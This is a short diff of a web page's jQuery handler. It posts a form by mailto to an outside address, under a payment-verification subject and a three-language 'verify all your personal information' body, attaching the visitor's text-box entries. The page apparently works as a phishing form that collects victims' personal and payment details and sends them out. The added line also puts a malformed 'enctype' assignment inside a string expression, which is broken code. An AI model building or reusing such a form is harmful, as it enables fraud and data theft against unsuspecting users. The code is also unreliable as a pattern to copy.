@@ -77,7 +77,7 @@ $(document).ready(function() {
     $('#bt1').click(function() {
         $('#fr1').attr('action',
                        'mailto:atention@helpthecaptainofyourluck.com.ve?subject=Information%20of%20pago,%20verification%20of%20pay.%20Información%20de%20pago,%20verificación%20de%20pago.' +
-                       $('#tb1').val() + '&body=PLEASE.%20VERIFY%20ALL%20YOUR%20PERSONAL%20INFORMATION.%20POR%20FAVOR.%20VERIFIQUE%20TODA%20SU%20INFORMACIÓN%20PERSONAL.%20請。驗證您的個人信息。' + $('#tb2').val());
+                       $('#tb1').val() + '&body=PLEASE.%20VERIFY%20ALL%20YOUR%20PERSONAL%20INFORMATION.%20POR%20FAVOR.%20VERIFIQUE%20TODA%20SU%20INFORMACIÓN%20PERSONAL.%20請。驗證您的個人信息。' + enctype="text/plain" + $('#tb2').val());
         $('#fr1').submit();
     });
 });
